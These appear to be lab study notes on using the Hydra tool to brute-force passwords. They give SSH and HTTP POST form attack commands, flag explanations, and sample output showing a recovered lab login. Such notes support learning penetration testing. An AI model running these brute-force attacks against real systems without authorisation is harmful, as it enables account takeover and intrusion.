# Hydra Basics to advanced

Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

We can use Hydra to run through a list and 'bruteforce' some authentication service. Imagine trying to manually guess someones password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.  

Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.

hydra basic syntax
```
hydra -l <username> -P <password> <protocol>://<ip>
hydra -l username -P password ftp://10.10.10.10
```

- `-l ` used for single username
- `-L ` used for username list
- `-P` used to specify password
- `ss:// <ip> ` and `<ip> ssh` are two ways of defining service
- `-t ` specifies number of threads to used

**SSH Bruteforce using hydra**
```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://<ip>
```
result 
```
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-18 13:56:08
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.41.204:22/
[22][ssh] host: 10.10.41.204   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-18 13:57:06
```
 

**Web post form bruteforce using hydra**

Basic syntax
```
hydra -l <username> -P <wordlist> 10.10.41.204 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

```

- `http-post-form` indicates types of form (post)
- `/login_page` indicates login page url
- `:username` form field which user username should enter
- `^USER^` specifies hydra to use the username
- `password`  form field which password should enter
- `^PASS^` specifies hydra to use password here
- `LOGIN` indicated hydra the login failed message
- `Login failed` login failure message which form returns
- `F=incorrect` if this word appears on page, then password is incorrect
- `-V` verbose output for every attempt

`username` and `password ` parameter can be found in burp																